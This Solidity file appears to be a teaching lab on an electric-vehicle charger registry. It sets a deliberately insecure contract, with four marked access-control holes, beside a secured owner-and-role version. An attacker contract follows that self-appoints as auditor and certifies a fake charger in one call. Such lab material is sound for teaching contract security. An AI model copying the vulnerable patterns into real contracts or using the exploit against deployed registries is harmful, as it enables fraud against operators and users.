// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * SMART CONTRACT LAB:
 *   "Electric Vehicle Supply Equipment (EVSE)"
 *
 * We model:
 *   - EV charging points (EVSE) registered on-chain.
 *   - Tariffs (price per kWh).
 *   - Certification (only "certified" chargers are trusted).
 *
 * INSECURE VERSION:
 *   - Anyone can register EVSE.
 *   - Anyone can change tariffs and status.
 *   - Anyone can mark chargers as "certified".
 *
 * SECURE VERSION:
 *   - Only owner assigns:
 *       * Operators (can register/manage EVSE they own)
 *       * Auditors (can certify EVSE)
 *   - Clear "isTrustedEVSE" rules.
 */

/*//////////////////////////////////////////////////////////////
//                  INSECURE EVSE REGISTRY
//////////////////////////////////////////////////////////////*/

contract EVSERegistryInsecure {
    struct EVSE {
        address operator;      // who controls this charger
        string location;       // free text: GPS, address, etc.
        uint256 pricePerKWh;   // in wei or token units
        bool online;           // available for charging
        bool certified;        // "safety/standard" certified
        address certifiedBy;
        bool exists;
    }

    // evseId = uint256 index or hash
    mapping(uint256 => EVSE) public evses;
    // anyone can make themselves "auditor"
    mapping(address => bool) public isAuditor;

    uint256 public nextEvseId;

    event AuditorSet(address indexed who, bool status);
    event EVSERegistered(uint256 indexed id, address indexed operator, string location);
    event EVSEUpdated(uint256 indexed id, uint256 pricePerKWh, bool online);
    event EVSECertified(uint256 indexed id, address indexed auditor);

    /**
     * ⚠ VULN #1:
     * Anyone can mark themselves (or others) as auditor.
     */
    function setAuditor(address who, bool status) external {
        isAuditor[who] = status;
        emit AuditorSet(who, status);
    }

    /**
     * ⚠ VULN #2:
     * Anyone can register an EVSE and claim any location.
     */
    function registerEVSE(
        string calldata location,
        uint256 pricePerKWh,
        bool online
    ) external returns (uint256) {
        uint256 id = nextEvseId++;

        evses[id] = EVSE({
            operator: msg.sender,
            location: location,
            pricePerKWh: pricePerKWh,
            online: online,
            certified: false,
            certifiedBy: address(0),
            exists: true
        });

        emit EVSERegistered(id, msg.sender, location);
        return id;
    }

    /**
     * ⚠ VULN #3:
     * Anyone can change tariff and online status of any EVSE.
     */
    function updateEVSE(
        uint256 id,
        uint256 pricePerKWh,
        bool online
    ) external {
        EVSE storage e = evses[id];
        require(e.exists, "NO_EVSE");

        e.pricePerKWh = pricePerKWh;
        e.online = online;

        emit EVSEUpdated(id, pricePerKWh, online);
    }

    /**
     * ⚠ VULN #4:
     * Anyone can certify any EVSE.
     */
    function certifyEVSE(uint256 id) external {
        EVSE storage e = evses[id];
        require(e.exists, "NO_EVSE");

        e.certified = true;
        e.certifiedBy = msg.sender;

        emit EVSECertified(id, msg.sender);
    }

    /**
     * Fake trust check:
     *  - EVSE exists
     *  - online
     *  - certified == true
     *  - certifiedBy is "auditor" (but mapping is attacker-controlled)
     */
    function isTrustedEVSE(uint256 id) external view returns (bool) {
        EVSE storage e = evses[id];
        if (!e.exists) return false;
        if (!e.online) return false;
        if (!e.certified) return false;
        if (!isAuditor[e.certifiedBy]) return false;
        return true;
    }
}

/*//////////////////////////////////////////////////////////////
//                           OWNABLE
//////////////////////////////////////////////////////////////*/

contract Ownable {
    address public owner;

    event OwnershipTransferred(address indexed oldOwner, address indexed newOwner);

    constructor() {
        owner = msg.sender;
        emit OwnershipTransferred(address(0), msg.sender);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "NOT_OWNER");
        _;
    }

    function transferOwnership(address newOwner) external onlyOwner {
        require(newOwner != address(0), "ZERO_ADDRESS");
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }
}

/*//////////////////////////////////////////////////////////////
//                  SECURE EVSE REGISTRY (DEFENDED)
//////////////////////////////////////////////////////////////*/

contract EVSERegistrySecure is Ownable {
    struct EVSE {
        uint256 id;
        address operator;      // operator that owns this EVSE
        bytes32 locationHash;  // hash of location data
        uint256 pricePerKWh;
        bool online;
        bool certified;
        address certifiedBy;
        bool exists;
    }

    mapping(uint256 => EVSE) public evses;
    mapping(address => bool) public isOperator;  // who may manage EVSE
    mapping(address => bool) public isAuditor;   // who may certify EVSE

    uint256 public nextEvseId;

    event OperatorSet(address indexed who, bool status);
    event AuditorSet(address indexed who, bool status);
    event EVSERegistered(uint256 indexed id, address indexed operator, bytes32 locationHash);
    event EVSEUpdated(uint256 indexed id, uint256 pricePerKWh, bool online);
    event EVSECertified(uint256 indexed id, address indexed auditor);

    modifier onlyOperator() {
        require(isOperator[msg.sender], "NOT_OPERATOR");
        _;
    }

    modifier onlyAuditor() {
        require(isAuditor[msg.sender], "NOT_AUDITOR");
        _;
    }

    /**
     * Owner assigns EVSE operators (CPOs, utilities, etc.).
     */
    function setOperator(address who, bool status) external onlyOwner {
        require(who != address(0), "ZERO_ADDRESS");
        isOperator[who] = status;
        emit OperatorSet(who, status);
    }

    /**
     * Owner assigns auditors (safety / compliance bodies).
     */
    function setAuditor(address who, bool status) external onlyOwner {
        require(who != address(0), "ZERO_ADDRESS");
        isAuditor[who] = status;
        emit AuditorSet(who, status);
    }

    /**
     * Operator registers a new EVSE with hashed location.
     *
     * locationHash = keccak256(abi.encodePacked("lat,long,address..."))
     */
    function registerEVSE(
        bytes32 locationHash,
        uint256 pricePerKWh,
        bool online
    ) external onlyOperator returns (uint256) {
        require(locationHash != bytes32(0), "BAD_LOCATION");

        uint256 id = nextEvseId++;

        evses[id] = EVSE({
            id: id,
            operator: msg.sender,
            locationHash: locationHash,
            pricePerKWh: pricePerKWh,
            online: online,
            certified: false,
            certifiedBy: address(0),
            exists: true
        });

        emit EVSERegistered(id, msg.sender, locationHash);
        return id;
    }

    /**
     * Operator updates its own EVSE tariff and status.
     */
    function updateEVSE(
        uint256 id,
        uint256 pricePerKWh,
        bool online
    ) external onlyOperator {
        EVSE storage e = evses[id];
        require(e.exists, "NO_EVSE");
        require(e.operator == msg.sender, "NOT_OWNER_OF_EVSE");

        e.pricePerKWh = pricePerKWh;
        e.online = online;

        emit EVSEUpdated(id, pricePerKWh, online);
    }

    /**
     * Auditor certifies EVSE (e.g., after inspection).
     */
    function certifyEVSE(uint256 id) external onlyAuditor {
        EVSE storage e = evses[id];
        require(e.exists, "NO_EVSE");

        e.certified = true;
        e.certifiedBy = msg.sender;

        emit EVSECertified(id, msg.sender);
    }

    /**
     * Trusted EVSE:
     *  - EVSE exists
     *  - operator is still authorized
     *  - online
     *  - certified
     *  - certifiedBy is active auditor
     */
    function isTrustedEVSE(uint256 id) external view returns (bool) {
        EVSE storage e = evses[id];
        if (!e.exists) return false;
        if (!isOperator[e.operator]) return false;
        if (!e.online) return false;
        if (!e.certified) return false;
        if (!isAuditor[e.certifiedBy]) return false;
        return true;
    }
}

/*//////////////////////////////////////////////////////////////
//                        ATTACKER CONTRACT
//////////////////////////////////////////////////////////////*/

contract EVSEAttacker {
    EVSERegistryInsecure public target;

    constructor(address _target) {
        target = EVSERegistryInsecure(_target);
    }

    /**
     * Step 1 — become auditor in the insecure registry.
     */
    function becomeAuditor() public {
        target.setAuditor(address(this), true);
    }

    /**
     * Step 2 — register a fake/malicious EVSE.
     */
    function registerFakeEVSE(
        string calldata location,
        uint256 pricePerKWh,
        bool online
    ) public returns (uint256) {
        return target.registerEVSE(location, pricePerKWh, online);
    }

    /**
     * Step 3 — certify your own fake EVSE.
     */
    function certifyFake(uint256 id) public {
        target.certifyEVSE(id);
    }

    /**
     * One-click exploit:
     *   - become auditor
     *   - register fake EVSE
     *   - certify it
     */
    function fullAttack(
        string calldata location,
        uint256 pricePerKWh,
        bool online
    ) external returns (uint256) {
        becomeAuditor();
        uint256 id = registerFakeEVSE(location, pricePerKWh, online);
        certifyFake(id);
        return id;
    }
}
